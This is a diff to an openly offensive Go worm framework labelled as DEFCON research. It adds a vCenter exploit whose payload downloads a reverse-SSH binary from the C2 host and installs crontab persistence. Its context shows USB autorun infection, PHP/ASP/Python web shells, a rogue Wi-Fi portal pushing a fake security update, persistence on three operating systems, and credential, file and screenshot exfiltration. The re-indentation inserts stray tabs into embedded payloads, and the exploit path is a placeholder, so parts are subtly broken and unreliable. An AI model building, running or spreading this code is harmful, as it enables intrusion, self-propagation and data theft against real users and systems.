@@ -1,5 +1,5 @@
 // worm.go - Complete Worm Framework - Cross-Platform (Windows/Linux/macOS/ARM)
-// EDUCATIONAL PURPOSE ONLY 
+// EDUCATIONAL PURPOSE ONLY
 // DEFCON 34 - Advanced Malware Research
 
 package main
@@ -50,6 +50,7 @@ const (
 	USB_POLL_INTERVAL   = 5 * time.Second
 	WIFI_BEACON_SSID    = "Free_Public_WiFi"
 	WIFI_EVIL_PORTAL_PORT = 8443
+	REVERSE_SSH_PORT    = 443
 )
 
 var (
@@ -120,35 +121,35 @@ func NewUSBPropagator() *USBPropagator {
 
 func generateAutorunInf() string {
 	switch runtime.GOOS {
-	case "windows":
-		return `[AutoRun]
-open=SystemUpdate.exe
-action=Open folder to view files
-shell\open\command=SystemUpdate.exe
-shell\open\default=1
-shellexecute=SystemUpdate.exe
-UseAutoPlay=1
-`
-	case "darwin":
-		return `<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.apple.systemupdate</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/Volumes/SystemUpdate/SystemUpdate.app/Contents/MacOS/SystemUpdate</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-</dict>
-</plist>`
-	default:
-		return `#!/bin/bash
-# USB Auto-execution script
-./system-update &
-`
+		case "windows":
+			return `[AutoRun]
+			open=SystemUpdate.exe
+			action=Open folder to view files
+			shell\open\command=SystemUpdate.exe
+			shell\open\default=1
+			shellexecute=SystemUpdate.exe
+			UseAutoPlay=1
+			`
+		case "darwin":
+			return `<?xml version="1.0" encoding="UTF-8"?>
+			<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+			<plist version="1.0">
+			<dict>
+			<key>Label</key>
+			<string>com.apple.systemupdate</string>
+			<key>ProgramArguments</key>
+			<array>
+			<string>/Volumes/SystemUpdate/SystemUpdate.app/Contents/MacOS/SystemUpdate</string>
+			</array>
+			<key>RunAtLoad</key>
+			<true/>
+			</dict>
+			</plist>`
+		default:
+			return `#!/bin/bash
+			# USB Auto-execution script
+			./system-update &
+			`
 	}
 }
 
@@ -162,12 +163,12 @@ func (usb *USBPropagator) StartMonitoring() {
 
 func (usb *USBPropagator) monitorDrives() {
 	switch runtime.GOOS {
-	case "windows":
-		usb.monitorWindowsDrives()
-	case "darwin":
-		usb.monitorMacDrives()
-	default:
-		usb.monitorLinuxDrives()
+		case "windows":
+			usb.monitorWindowsDrives()
+		case "darwin":
+			usb.monitorMacDrives()
+		default:
+			usb.monitorLinuxDrives()
 	}
 }
 
@@ -228,19 +229,18 @@ func (usb *USBPropagator) checkAndInfectUSB(path string) {
 
 func (usb *USBPropagator) isRemovable(path string) bool {
 	switch runtime.GOOS {
-	case "windows":
-		return usb.isRemovableWindows(path)
-	case "darwin":
-		return strings.HasPrefix(path, "/Volumes/")
-	default:
-		return strings.HasPrefix(path, "/media/") ||
+		case "windows":
+			return usb.isRemovableWindows(path)
+		case "darwin":
+			return strings.HasPrefix(path, "/Volumes/")
+		default:
+			return strings.HasPrefix(path, "/media/") ||
 			strings.HasPrefix(path, "/mnt/") ||
 			strings.HasPrefix(path, "/run/media/") ||
 			strings.HasPrefix(path, "/mnt/sd")
 	}
 }
 
-// Stub for Windows – always returns false on non-Windows
 func (usb *USBPropagator) isRemovableWindows(path string) bool {
 	return false
 }
@@ -252,12 +252,12 @@ func (usb *USBPropagator) infectUSB(path string) {
 	wormData, _ := ioutil.ReadFile(exe)
 
 	switch runtime.GOOS {
-	case "windows":
-		usb.infectUSBWindows(path, wormData)
-	case "darwin":
-		usb.infectUSBMac(path, wormData)
-	default:
-		usb.infectUSBLinux(path, wormData)
+		case "windows":
+			usb.infectUSBWindows(path, wormData)
+		case "darwin":
+			usb.infectUSBMac(path, wormData)
+		default:
+			usb.infectUSBLinux(path, wormData)
 	}
 
 	fmt.Printf("[USB] Successfully infected %s\n", path)
@@ -283,17 +283,17 @@ func (usb *USBPropagator) infectUSBMac(path string, wormData []byte) {
 
 	plistPath := filepath.Join(path, "SystemUpdate.app", "Contents", "Info.plist")
 	plist := `<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>CFBundleExecutable</key>
-    <string>SystemUpdate</string>
-    <key>CFBundleName</key>
-    <string>SystemUpdate</string>
-    <key>CFBundlePackageType</key>
-    <string>APPL</string>
-</dict>
-</plist>`
+	<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+	<plist version="1.0">
+	<dict>
+	<key>CFBundleExecutable</key>
+	<string>SystemUpdate</string>
+	<key>CFBundleName</key>
+	<string>SystemUpdate</string>
+	<key>CFBundlePackageType</key>
+	<string>APPL</string>
+	</dict>
+	</plist>`
 	ioutil.WriteFile(plistPath, []byte(plist), 0644)
 
 	exec.Command("SetFile", "-a", "V", path+"/SystemUpdate.app").Run()
@@ -307,24 +307,24 @@ func (usb *USBPropagator) infectUSBLinux(path string, wormData []byte) {
 	ioutil.WriteFile("/etc/udev/rules.d/99-usb-autorun.rules", []byte(udevRule), 0644)
 
 	desktopContent := fmt.Sprintf(`[Desktop Entry]
-Type=Application
-Name=System Update
-Exec=%s
-Hidden=true
-`, destPath)
+	Type=Application
+	Name=System Update
+	Exec=%s
+	Hidden=true
+	`, destPath)
 	ioutil.WriteFile(filepath.Join(path, ".system-update.desktop"), []byte(desktopContent), 0644)
 }
 
 func (usb *USBPropagator) createUSBLnk(path string) {
 	vbScript := fmt.Sprintf(`
-Set oWS = WScript.CreateObject("WScript.Shell")
-sLinkFile = "%s\\System Update.lnk"
-Set oLink = oWS.CreateShortcut(sLinkFile)
-oLink.TargetPath = "%s\\SystemUpdate.exe"
-oLink.WindowStyle = 7
-oLink.IconLocation = "%%SystemRoot%%\\System32\\shell32.dll, 4"
-oLink.Save
-`, path, path)
+	Set oWS = WScript.CreateObject("WScript.Shell")
+	sLinkFile = "%s\\System Update.lnk"
+	Set oLink = oWS.CreateShortcut(sLinkFile)
+	oLink.TargetPath = "%s\\SystemUpdate.exe"
+	oLink.WindowStyle = 7
+	oLink.IconLocation = "%%SystemRoot%%\\System32\\shell32.dll, 4"
+	oLink.Save
+	`, path, path)
 
 	scriptPath := filepath.Join(path, "create_lnk.vbs")
 	ioutil.WriteFile(scriptPath, []byte(vbScript), 0644)
@@ -351,45 +351,45 @@ func NewWebShellManager() *WebShellManager {
 
 func loadWebShells() []WebShell {
 	phpShell := `<?php
-    if(isset($_REQUEST['cmd'])){
-        system($_REQUEST['cmd']);
-    }
-    if(isset($_FILES['file'])){
-        move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
-    }
-    if(isset($_REQUEST['data'])){
-        file_put_contents("exfil.dat", base64_decode($_REQUEST['data']), FILE_APPEND);
-    }
-    if(isset($_REQUEST['worm'])){
-        $worm = base64_decode($_REQUEST['worm']);
-        file_put_contents("system-update.php", $worm);
-    }
-    echo "OK";
-    ?>`
+	if(isset($_REQUEST['cmd'])){
+		system($_REQUEST['cmd']);
+}
+if(isset($_FILES['file'])){
+	move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+}
+if(isset($_REQUEST['data'])){
+	file_put_contents("exfil.dat", base64_decode($_REQUEST['data']), FILE_APPEND);
+}
+if(isset($_REQUEST['worm'])){
+	$worm = base64_decode($_REQUEST['worm']);
+	file_put_contents("system-update.php", $worm);
+}
+echo "OK";
+?>`
 
-	aspShell := `<%@ Page Language="Jscript"%>
-    <% if(Request["cmd"] != null){
-        var cmd = Request["cmd"];
-        var p = System.Diagnostics.Process.GetProcessById(System.Diagnostics.Process.GetCurrentProcess().Id);
-        var shell = p.MainModule.FileName;
-        var o = System.Diagnostics.Process.Start(shell, "/c " + cmd);
-        Response.Write(o.StandardOutput.ReadToEnd());
-    }%>`
+aspShell := `<%@ Page Language="Jscript"%>
+<% if(Request["cmd"] != null){
+var cmd = Request["cmd"];
+var p = System.Diagnostics.Process.GetProcessById(System.Diagnostics.Process.GetCurrentProcess().Id);
+var shell = p.MainModule.FileName;
+var o = System.Diagnostics.Process.Start(shell, "/c " + cmd);
+Response.Write(o.StandardOutput.ReadToEnd());
+}%>`
 
-	pythonShell := `#!/usr/bin/env python
+pythonShell := `#!/usr/bin/env python
 import cgi, subprocess, base64
 form = cgi.FieldStorage()
-if 'cmd' in form:
-    print subprocess.check_output(form['cmd'].value, shell=True)
-if 'worm' in form:
-    open('system-update.py', 'w').write(base64.b64decode(form['worm'].value))
-print "OK"`
+	if 'cmd' in form:
+		print subprocess.check_output(form['cmd'].value, shell=True)
+		if 'worm' in form:
+			open('system-update.py', 'w').write(base64.b64decode(form['worm'].value))
+			print "OK"`
 
-	return []WebShell{
-		{Path: "/wp-content/uploads/shell.php", Type: "PHP", Content: phpShell, Backdoor: []string{"/shell.php", "/backdoor.php"}},
-		{Path: "/shell.aspx", Type: "ASP", Content: aspShell, Backdoor: []string{"/backdoor.aspx"}},
-		{Path: "/cgi-bin/shell.py", Type: "PYTHON", Content: pythonShell, Backdoor: []string{"/cgi-bin/update.py"}},
-	}
+			return []WebShell{
+				{Path: "/wp-content/uploads/shell.php", Type: "PHP", Content: phpShell, Backdoor: []string{"/shell.php", "/backdoor.php"}},
+				{Path: "/shell.aspx", Type: "ASP", Content: aspShell, Backdoor: []string{"/backdoor.aspx"}},
+				{Path: "/cgi-bin/shell.py", Type: "PYTHON", Content: pythonShell, Backdoor: []string{"/cgi-bin/update.py"}},
+			}
 }
 
 func (wsm *WebShellManager) DeployOnTarget(target string) bool {
@@ -568,14 +568,14 @@ func (wp *WiFiPropagator) Start() {
 	go wp.startDNSSpoofing()
 
 	switch runtime.GOOS {
-	case "linux":
-		go wp.startRogueAPLinux()
-		go wp.deauthAttackLinux()
-	case "darwin":
-		go wp.startRogueAPMac()
-		go wp.deauthAttackMac()
-	default:
-		fmt.Println("[WiFi] WiFi propagation not supported on this OS")
+		case "linux":
+			go wp.startRogueAPLinux()
+			go wp.deauthAttackLinux()
+		case "darwin":
+			go wp.startRogueAPMac()
+			go wp.deauthAttackMac()
+		default:
+			fmt.Println("[WiFi] WiFi propagation not supported on this OS")
 	}
 }
 
@@ -588,8 +588,8 @@ func (wp *WiFiPropagator) hasWiFiCapability() bool {
 		name := iface.Name
 		if strings.Contains(name, "wlan") || strings.Contains(name, "wlp") ||
 			strings.Contains(name, "en0") || strings.Contains(name, "awdl") {
-			return true
-		}
+				return true
+			}
 	}
 	if runtime.GOARCH == "arm" || runtime.GOARCH == "arm64" {
 		if _, err := os.Stat("/sys/class/net/wlan0"); err == nil {
@@ -601,29 +601,29 @@ func (wp *WiFiPropagator) hasWiFiCapability() bool {
 
 func (wp *WiFiPropagator) startRogueAPLinux() {
 	hostapdConf := fmt.Sprintf(`interface=%s
-driver=nl80211
-ssid=%s
-hw_mode=g
-channel=%d
-macaddr_acl=0
-auth_algs=1
-ignore_broadcast_ssid=0
-wpa=2
-wpa_passphrase=password
-wpa_key_mgmt=WPA-PSK
-wpa_pairwise=TKIP
-rsn_pairwise=CCMP
-`, wp.interfaceName, wp.apSSID, wp.apChannel)
+	driver=nl80211
+	ssid=%s
+	hw_mode=g
+	channel=%d
+	macaddr_acl=0
+	auth_algs=1
+	ignore_broadcast_ssid=0
+	wpa=2
+	wpa_passphrase=password
+	wpa_key_mgmt=WPA-PSK
+	wpa_pairwise=TKIP
+	rsn_pairwise=CCMP
+	`, wp.interfaceName, wp.apSSID, wp.apChannel)
 
 	ioutil.WriteFile("/tmp/hostapd.conf", []byte(hostapdConf), 0644)
 	exec.Command("hostapd", "/tmp/hostapd.conf").Start()
 
 	dhcpConf := `interface=wlan0
-dhcp-range=192.168.100.10,192.168.100.100,255.255.255.0,12h
-dhcp-option=3,192.168.100.1
-dhcp-option=6,192.168.100.1
-server=8.8.8.8
-`
+	dhcp-range=192.168.100.10,192.168.100.100,255.255.255.0,12h
+	dhcp-option=3,192.168.100.1
+	dhcp-option=6,192.168.100.1
+	server=8.8.8.8
+	`
 	ioutil.WriteFile("/tmp/dhcpd.conf", []byte(dhcpConf), 0644)
 	exec.Command("dnsmasq", "-C", "/tmp/dhcpd.conf", "-d").Start()
 
@@ -668,15 +668,15 @@ func (wp *WiFiPropagator) portalHandler(w http.ResponseWriter, r *http.Request) 
 	wp.mu.Unlock()
 
 	html := `<!DOCTYPE html>
-<html>
-<head><title>Free Public WiFi</title></head>
-<body>
-<h2>Welcome to Free Public WiFi</h2>
-<p>To access the internet, please download and install our security update.</p>
-<a href="/download">Download Security Update</a>
-<p>This is required for compliance with network security policies.</p>
-</body>
-</html>`
+	<html>
+	<head><title>Free Public WiFi</title></head>
+	<body>
+	<h2>Welcome to Free Public WiFi</h2>
+	<p>To access the internet, please download and install our security update.</p>
+	<a href="/download">Download Security Update</a>
+	<p>This is required for compliance with network security policies.</p>
+	</body>
+	</html>`
 
 	w.Header().Set("Content-Type", "text/html")
 	w.Write([]byte(html))
@@ -744,41 +744,39 @@ func NewPersistenceManager() *PersistenceManager {
 
 func (pm *PersistenceManager) InstallAll() error {
 	switch runtime.GOOS {
-	case "windows":
-		return pm.installWindows()
-	case "darwin":
-		return pm.installMacOS()
-	default:
-		return pm.installLinux()
+		case "windows":
+			return pm.installWindows()
+		case "darwin":
+			return pm.installMacOS()
+		default:
+			return pm.installLinux()
 	}
 }
 
-// Stub for Windows – does nothing on non-Windows
 func (pm *PersistenceManager) installWindows() error {
 	return nil
 }
 
-// Stub for Windows WMI – does nothing on non-Windows
 func (pm *PersistenceManager) installWMI() {}
 
 func (pm *PersistenceManager) installMacOS() error {
 	launchAgentPath := filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents", "com.apple.systemupdate.plist")
 	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.apple.systemupdate</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>%s</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-</dict>
-</plist>`, pm.wormPath)
+	<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+	<plist version="1.0">
+	<dict>
+	<key>Label</key>
+	<string>com.apple.systemupdate</string>
+	<key>ProgramArguments</key>
+	<array>
+	<string>%s</string>
+	</array>
+	<key>RunAtLoad</key>
+	<true/>
+	<key>KeepAlive</key>
+	<true/>
+	</dict>
+	</plist>`, pm.wormPath)
 
 	ioutil.WriteFile(launchAgentPath, []byte(plist), 0644)
 	exec.Command("launchctl", "load", launchAgentPath).Run()
@@ -805,16 +803,16 @@ func (pm *PersistenceManager) installLinux() error {
 
 	if hasSystemd {
 		serviceContent := fmt.Sprintf(`[Unit]
-Description=System Update Service
-After=network.target
+		Description=System Update Service
+		After=network.target
 
-[Service]
-ExecStart=%s
-Restart=always
-RestartSec=60
+		[Service]
+		ExecStart=%s
+		Restart=always
+		RestartSec=60
 
-[Install]
-WantedBy=multi-user.target`, pm.wormPath)
+		[Install]
+		WantedBy=multi-user.target`, pm.wormPath)
 		ioutil.WriteFile("/etc/systemd/system/system-update.service", []byte(serviceContent), 0644)
 		exec.Command("systemctl", "enable", "system-update.service").Run()
 		exec.Command("systemctl", "start", "system-update.service").Run()
@@ -829,29 +827,29 @@ WantedBy=multi-user.target`, pm.wormPath)
 		}
 
 		initScript := fmt.Sprintf(`#!/bin/sh
-### BEGIN INIT INFO
-# Provides:          system-update
-# Required-Start:    $network
-# Required-Stop:
-# Default-Start:     2 3 4 5
-# Default-Stop:      0 1 6
-# Short-Description: System Update
-### END INIT INFO
+		### BEGIN INIT INFO
+		# Provides:          system-update
+		# Required-Start:    $network
+		# Required-Stop:
+		# Default-Start:     2 3 4 5
+		# Default-Stop:      0 1 6
+		# Short-Description: System Update
+		### END INIT INFO
 
-case "$1" in
-    start)
-        %s &
-        ;;
-    stop)
-        killall system-update
-        ;;
-    restart)
-        $0 stop
-        $0 start
-        ;;
-esac
-exit 0
-`, pm.wormPath)
+		case "$1" in
+		start)
+		%s &
+		;;
+		stop)
+		killall system-update
+		;;
+		restart)
+		$0 stop
+		$0 start
+		;;
+		esac
+		exit 0
+		`, pm.wormPath)
 		ioutil.WriteFile("/etc/init.d/system-update", []byte(initScript), 0755)
 		exec.Command("update-rc.d", "system-update", "defaults").Run()
 	}
@@ -995,22 +993,21 @@ func (wp *WormPopulation) assignScanTasks() {
 	wp.mu.RUnlock()
 
 	if len(followers) == 0 {
-		return
-	}
+		return	}
 
-	cidrs := generateCIDRs()
-	for i, follower := range followers {
-		if i < len(cidrs) {
-			task := Task{
-				ID:       generateID(),
-				Type:     "SCAN",
-				Target:   cidrs[i],
-				Priority: 1,
-				Status:   "ASSIGNED",
+		cidrs := generateCIDRs()
+		for i, follower := range followers {
+			if i < len(cidrs) {
+				task := Task{
+					ID:       generateID(),
+					Type:     "SCAN",
+					Target:   cidrs[i],
+					Priority: 1,
+					Status:   "ASSIGNED",
+				}
+				wp.sendTaskToPeer(follower, task)
 			}
-			wp.sendTaskToPeer(follower, task)
 		}
-	}
 }
 
 func (wp *WormPopulation) sendTaskToPeer(peerID string, task Task) {
@@ -1020,7 +1017,7 @@ func (wp *WormPopulation) sendTaskToPeer(peerID string, task Task) {
 		Timestamp: time.Now(),
 		Payload:   task,
 	}
-	_, _ = json.Marshal(msg) // placeholder for actual network send
+	_, _ = json.Marshal(msg)
 	fmt.Printf("[*] Assigned task %s to %s\n", task.ID, peerID)
 }
 
@@ -1032,7 +1029,6 @@ func (wp *WormPopulation) balancePopulation() {
 	}
 }
 
-// Stub for Windows mutex
 func (wp *WormPopulation) checkWindowsMutex() bool {
 	return false
 }
@@ -1066,16 +1062,16 @@ func (wp *WormPopulation) DecideAction() string {
 	wp.mu.RUnlock()
 
 	switch {
-	case localCount == 0:
-		return "FULL_INSTALL"
-	case localCount == 1 && totalCount < wp.maxPopulation/2:
-		return "SUPPLEMENT_PROPAGATION"
-	case localCount > 1 && totalCount < wp.maxPopulation:
-		return "COORDINATED_SCAN"
-	case totalCount >= wp.maxPopulation:
-		return "EXPAND_NETWORK"
-	default:
-		return "STEALTH_MODE"
+		case localCount == 0:
+			return "FULL_INSTALL"
+		case localCount == 1 && totalCount < wp.maxPopulation/2:
+			return "SUPPLEMENT_PROPAGATION"
+		case localCount > 1 && totalCount < wp.maxPopulation:
+			return "COORDINATED_SCAN"
+		case totalCount >= wp.maxPopulation:
+			return "EXPAND_NETWORK"
+		default:
+			return "STEALTH_MODE"
 	}
 }
 
@@ -1119,16 +1115,16 @@ func (p *Propagator) Start() {
 	fmt.Printf("[*] Starting propagation with action: %s\n", action)
 
 	switch action {
-	case "FULL_INSTALL":
-		p.aggressivePropagation()
-	case "SUPPLEMENT_PROPAGATION":
-		p.targetedPropagation()
-	case "COORDINATED_SCAN":
-		p.coordinatedScan()
-	case "EXPAND_NETWORK":
-		p.expandToNewNetworks()
-	case "STEALTH_MODE":
-		p.stealthPropagation()
+		case "FULL_INSTALL":
+			p.aggressivePropagation()
+		case "SUPPLEMENT_PROPAGATION":
+			p.targetedPropagation()
+		case "COORDINATED_SCAN":
+			p.coordinatedScan()
+		case "EXPAND_NETWORK":
+			p.expandToNewNetworks()
+		case "STEALTH_MODE":
+			p.stealthPropagation()
 	}
 }
 
@@ -1185,16 +1181,90 @@ func (p *Propagator) isPortOpen(host string, port int) bool {
 	return true
 }
 
+// ----- VMWARE VCENTER EXPLOIT (CVE-2026-59310) -----
+
+func (p *Propagator) isVCenter(target string) bool {
+	client := &http.Client{
+		Timeout: 5 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	paths := []string{
+		"/ui/",
+		"/vsphere-client/",
+		"/websso/SAML2/SSO",
+		"/sdk/",
+	}
+	for _, path := range paths {
+		url := fmt.Sprintf("https://%s%s", target, path)
+		resp, err := client.Get(url)
+		if err == nil {
+			defer resp.Body.Close()
+			body, _ := ioutil.ReadAll(resp.Body)
+			if strings.Contains(string(body), "vmware") || strings.Contains(string(body), "vCenter") {
+				return true
+			}
+		}
+	}
+	return false
+}
+
+func (p *Propagator) exploitVCenter(target string) bool {
+	fmt.Printf("[*] Attempting CVE-2026-59310 on %s\n", target)
+
+	exploitPath := "/syslog/../../../../path/to/rce"
+
+	payload := fmt.Sprintf(`#!/bin/bash
+	wget -O /tmp/reverse_ssh https://%s/reverse_ssh
+	chmod +x /tmp/reverse_ssh
+	/tmp/reverse_ssh -l %s -p %d &
+	(crontab -l 2>/dev/null; echo "@reboot /tmp/reverse_ssh -l %s -p %d") | crontab -
+	`, C2_DNS_DOMAIN, C2_DNS_DOMAIN, REVERSE_SSH_PORT, C2_DNS_DOMAIN, REVERSE_SSH_PORT)
+
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	req, err := http.NewRequest("POST", fmt.Sprintf("https://%s%s", target, exploitPath), strings.NewReader(payload))
+	if err != nil {
+		return false
+	}
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+	resp, err := client.Do(req)
+	if err == nil && resp.StatusCode == 200 {
+		defer resp.Body.Close()
+		fmt.Printf("[!] SUCCESS: CVE-2026-59310 exploited on %s\n", target)
+		p.mu.Lock()
+		p.infected[target] = true
+		p.mu.Unlock()
+		return true
+	}
+	if resp != nil {
+		resp.Body.Close()
+	}
+	return false
+}
+
 func (p *Propagator) attemptExploit(target string, port int) {
 	switch port {
-	case 22:
-		p.exploitSSH(target)
-	case 445:
-		p.exploitSMB(target)
-	case 80, 443:
-		p.exploitWeb(target)
-	default:
-		fmt.Printf("[*] No exploit for port %d on %s\n", port, target)
+		case 22:
+			p.exploitSSH(target)
+		case 443:
+			if p.isVCenter(target) {
+				p.exploitVCenter(target)
+			} else {
+				p.exploitWeb(target)
+			}
+		case 80:
+			p.exploitWeb(target)
+		case 445:
+			p.exploitSMB(target)
+		default:
+			fmt.Printf("[*] No exploit for port %d on %s\n", port, target)
 	}
 }
 
@@ -1483,7 +1553,6 @@ func (dt *DNSTunnel) recvLoop() {
 	dns.HandleFunc(dt.domain, func(w dns.ResponseWriter, r *dns.Msg) {
 		for _, q := range r.Question {
 			if q.Qtype == dns.TypeTXT {
-				// Extract command – placeholder
 			}
 		}
 	})
@@ -1530,18 +1599,18 @@ func (c2 *C2Manager) processCommands() {
 	for cmd := range c2.commands {
 		fmt.Printf("[C2] Received command: %s (type: %s)\n", cmd.ID, cmd.Type)
 		switch cmd.Type {
-		case "SCAN":
-			go c2.executeScan(cmd)
-		case "EXFIL":
-			go c2.executeExfil(cmd)
-		case "PROPAGATE":
-			go c2.executePropagate(cmd)
-		case "EXECUTE":
-			go c2.executeCommand(cmd)
-		case "UPDATE":
-			go c2.updateWorm(cmd)
-		case "SLEEP":
-			go c2.sleepWorm(cmd)
+			case "SCAN":
+				go c2.executeScan(cmd)
+			case "EXFIL":
+				go c2.executeExfil(cmd)
+			case "PROPAGATE":
+				go c2.executePropagate(cmd)
+			case "EXECUTE":
+				go c2.executeCommand(cmd)
+			case "UPDATE":
+				go c2.updateWorm(cmd)
+			case "SLEEP":
+				go c2.sleepWorm(cmd)
 		}
 	}
 }
@@ -1562,15 +1631,15 @@ func (c2 *C2Manager) executeScan(cmd C2Command) {
 func (c2 *C2Manager) executeExfil(cmd C2Command) {
 	dataType := cmd.Parameters["type"].(string)
 	switch dataType {
-	case "credentials":
-		c2.exfilCredentials()
-	case "files":
-		path := cmd.Parameters["path"].(string)
-		c2.exfilFiles(path)
-	case "screenshot":
-		c2.takeScreenshot()
-	case "keylogs":
-		c2.exfilKeylogs()
+		case "credentials":
+			c2.exfilCredentials()
+		case "files":
+			path := cmd.Parameters["path"].(string)
+			c2.exfilFiles(path)
+		case "screenshot":
+			c2.takeScreenshot()
+		case "keylogs":
+			c2.exfilKeylogs()
 	}
 }
 
@@ -1617,17 +1686,17 @@ func (c2 *C2Manager) exfilFiles(path string) {
 func (c2 *C2Manager) takeScreenshot() {
 	if runtime.GOOS == "windows" {
 		script := `
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
-$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
-$bitmap.Save('C:\Windows\Temp\screenshot.png')
-$base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Windows\Temp\screenshot.png'))
-Write-Output $base64
-Remove-Item 'C:\Windows\Temp\screenshot.png'
-`
+		Add-Type -AssemblyName System.Windows.Forms
+		Add-Type -AssemblyName System.Drawing
+		$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+		$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+		$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+		$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
+		$bitmap.Save('C:\Windows\Temp\screenshot.png')
+		$base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Windows\Temp\screenshot.png'))
+		Write-Output $base64
+		Remove-Item 'C:\Windows\Temp\screenshot.png'
+		`
 		output, _ := exec.Command("powershell", "-Command", script).Output()
 		dataBuffer <- ExfilData{
 			WormID:    wormID,
@@ -1644,10 +1713,10 @@ func (c2 *C2Manager) exfilKeylogs() {}
 func (c2 *C2Manager) executePropagate(cmd C2Command) {
 	method := cmd.Parameters["method"].(string)
 	switch method {
-	case "ssh":
-	case "smb":
-	case "webshell":
-	case "usb":
+		case "ssh":
+		case "smb":
+		case "webshell":
+		case "usb":
 	}
 }
 
@@ -1753,7 +1822,7 @@ func (de *DataExfiltrator) Start() {
 
 func (de *DataExfiltrator) connectToDatabase() {
 	dsn := fmt.Sprintf("%s:%s@tcp(%s:%d)/%s?charset=utf8mb4",
-		"worm_user", "worm_password", "db.example.com", 3306, "worm_data")
+			   "worm_user", "worm_password", "db.example.com", 3306, "worm_data")
 	for {
 		db, err := sql.Open("mysql", dsn)
 		if err == nil {
@@ -1769,38 +1838,38 @@ func (de *DataExfiltrator) connectToDatabase() {
 func (de *DataExfiltrator) createTables() {
 	queries := []string{
 		`CREATE TABLE IF NOT EXISTS exfil_data (
-            id BIGINT AUTO_INCREMENT PRIMARY KEY,
-            worm_id VARCHAR(64) NOT NULL,
-            timestamp DATETIME NOT NULL,
-            data_type VARCHAR(50) NOT NULL,
-            target VARCHAR(255),
-            data LONGTEXT,
-            encrypted BOOLEAN DEFAULT TRUE,
-            processed BOOLEAN DEFAULT FALSE,
-            INDEX idx_worm_id (worm_id),
-            INDEX idx_timestamp (timestamp)
-        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`,
-		`CREATE TABLE IF NOT EXISTS worm_instances (
-            worm_id VARCHAR(64) PRIMARY KEY,
-            ip_address VARCHAR(45),
-            hostname VARCHAR(255),
-            os VARCHAR(50),
-            arch VARCHAR(20),
-            first_seen DATETIME,
-            last_seen DATETIME,
-            status VARCHAR(20),
-            capabilities JSON
-        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`,
-		`CREATE TABLE IF NOT EXISTS compromised_targets (
-            id BIGINT AUTO_INCREMENT PRIMARY KEY,
-            target_ip VARCHAR(45),
-            target_hostname VARCHAR(255),
-            worm_id VARCHAR(64),
-            compromise_time DATETIME,
-            method VARCHAR(50),
-            credentials JSON,
-            UNIQUE KEY uk_target (target_ip)
-        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`,
+			id BIGINT AUTO_INCREMENT PRIMARY KEY,
+			worm_id VARCHAR(64) NOT NULL,
+			timestamp DATETIME NOT NULL,
+			data_type VARCHAR(50) NOT NULL,
+			target VARCHAR(255),
+			data LONGTEXT,
+			encrypted BOOLEAN DEFAULT TRUE,
+			processed BOOLEAN DEFAULT FALSE,
+			INDEX idx_worm_id (worm_id),
+			INDEX idx_timestamp (timestamp)
+			) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`,
+			`CREATE TABLE IF NOT EXISTS worm_instances (
+				worm_id VARCHAR(64) PRIMARY KEY,
+				ip_address VARCHAR(45),
+				hostname VARCHAR(255),
+				os VARCHAR(50),
+				arch VARCHAR(20),
+				first_seen DATETIME,
+				last_seen DATETIME,
+				status VARCHAR(20),
+				capabilities JSON
+				) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`,
+				`CREATE TABLE IF NOT EXISTS compromised_targets (
+					id BIGINT AUTO_INCREMENT PRIMARY KEY,
+					target_ip VARCHAR(45),
+					target_hostname VARCHAR(255),
+					worm_id VARCHAR(64),
+					compromise_time DATETIME,
+					method VARCHAR(50),
+					credentials JSON,
+					UNIQUE KEY uk_target (target_ip)
+					) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4`,
 	}
 	for _, query := range queries {
 		de.dbConn.Exec(query)
